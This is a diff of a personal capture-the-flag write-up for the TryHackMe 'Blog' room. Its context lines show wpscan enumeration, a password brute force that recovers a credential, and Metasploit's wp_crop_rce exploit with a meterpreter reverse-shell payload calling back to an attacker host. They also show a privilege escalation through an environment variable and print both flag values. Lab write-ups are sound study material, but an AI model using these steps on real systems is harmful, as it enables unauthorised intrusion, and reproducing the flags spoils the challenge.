@@ -4,7 +4,6 @@ Billy Joel made a Wordpress blog!
 
 ![|333](https://tryhackme-images.s3.amazonaws.com/room-icons/618f1cc93596ff4082250bce9d869767.png)
 
-
 Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!
 
 Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole...
@@ -16,7 +15,6 @@ Credit to Sq00ky for the root privesc idea ;)
 ```
 ┌──(root㉿kali)-[/home/kali]
 └─# echo '10.10.126.158 blog.thm' >> /etc/hosts
-
 
 ┌──(kali㉿kali)-[~]
 └─$ wpscan --url http://blog.thm --enumerate u 
@@ -140,7 +138,6 @@ Interesting Finding(s):
 [+] Memory used: 167.387 MB
 [+] Elapsed time: 00:00:23
 
-
 so
 
 ┌──(kali㉿kali)-[~/blog_wp]
@@ -201,7 +198,6 @@ Host script results:
 |   date: 2022-10-04T02:38:31
 |_  start_date: N/A
 
-
 ┌──(kali㉿kali)-[~/blog_wp]
 └─$ smbclient -L //10.10.142.247                     
 Password for [WORKGROUP\kali]:
@@ -219,7 +215,6 @@ Reconnecting with SMB1 for workgroup listing.
         Workgroup            Master
         ---------            -------
         WORKGROUP            BLOG
-
 
 ┌──(kali㉿kali)-[~/blog_wp]
 └─$ smbclient //10.10.142.247/BillySMB
@@ -245,7 +240,6 @@ smb: \> exit
 └─$ ls
 Alice-White-Rabbit.jpg  check-this.png  tswift.mp4
 
-
 ┌──(kali㉿kali)-[~/blog_wp]
 └─$ ls
 Alice-White-Rabbit.jpg  check-this.png  tswift.mp4
@@ -260,7 +254,6 @@ wrote extracted data to "rabbit_hole.txt".
 You've found yourself in a rabbit hole, friend.
 
 The jpg file is a rabbit hole
-
 
 for qr code
 
@@ -321,7 +314,6 @@ We know that the version of Wordpress is outdated (version 5.0.0) and we have fo
     bjoel
 
 Let’s save the users to users.txt and try to brute force: 
-
 
 ┌──(kali㉿kali)-[~/blog_wp]
 └─$ wpscan -U users.txt -P /usr/share/wordlists/rockyou.txt --url http://blog.thm
@@ -414,7 +406,6 @@ after a long time
 [!] Valid Combinations Found:
  | Username: kwheel, Password: cutiepie1
 
-
 ┌──(kali㉿kali)-[~/blog_wp]
 └─$ searchsploit wordpress 5.0.0
 ------------------------------------------------------------------------------ ---------------------------------
@@ -445,7 +436,6 @@ Matching Modules
    -  ----                            ---------------  ----       -----  -----------
    0  exploit/multi/http/wp_crop_rce  2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload
 
-
 Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/wp_crop_rce
 
 msf6 > use 0
@@ -466,7 +456,6 @@ Module options (exploit/multi/http/wp_crop_rce):
    USERNAME                    yes       The WordPress username to authenticate with
    VHOST                       no        HTTP server virtual host
 
-
 Payload options (php/meterpreter/reverse_tcp):
 
    Name   Current Setting  Required  Description
@@ -474,13 +463,11 @@ Payload options (php/meterpreter/reverse_tcp):
    LHOST  192.168.253.128  yes       The listen address (an interface may be specified)
    LPORT  4444             yes       The listen port
 
-
 Exploit target:
 
    Id  Name
    --  ----
    0   WordPress
-
 
 msf6 exploit(multi/http/wp_crop_rce) > set rhost blog.thm
 rhost => blog.thm
@@ -584,7 +571,6 @@ file /usr/sbin/checker
 
 The executable is a 64bit ELF
 
-
 www-data@blog:/var/www/wordpress$ ltrace /usr/sbin/checker
 ltrace /usr/sbin/checker
 getenv("admin")                                  = nil
@@ -593,8 +579,6 @@ puts("Not an Admin"Not an Admin
 +++ exited (status 0) +++
 
 Running it with ltrace reveals that the executable is checking an environment variable (admin) to determine if we are an admin: 
-
-
 
 Let’s create an admin environment variable and set it at 1: 
 
@@ -626,7 +610,6 @@ root@blog:/root# cat root.txt
 cat root.txt
 9a0b2b618bef9bfa7ac28c1353d9f318
 
-
 user.txt
 
 root@blog:/root# find / -type f -name user.txt 2>/dev/null
@@ -642,12 +625,7 @@ root@blog:/root# cat /media/usb/user.txt
 cat /media/usb/user.txt
 c8421899aae571f7af486492b71a8ab7
 
-
-
 ```
-
-![[Pasted image 20221003214536.png]]
-
 
 root.txt
 *9a0b2b618bef9bfa7ac28c1353d9f318*
@@ -675,12 +653,9 @@ What version of the above CMS was being used?
 
 ### Credits 
 
-
 The images used in this room have been used with the author's permission or in accordance with Section 107 of the U.S. Copyright Act.
 https://www.copyright.gov/title17/92chap1.html#107
 
-
 Congratulations!
-
 
 [[Web Enumeration]]
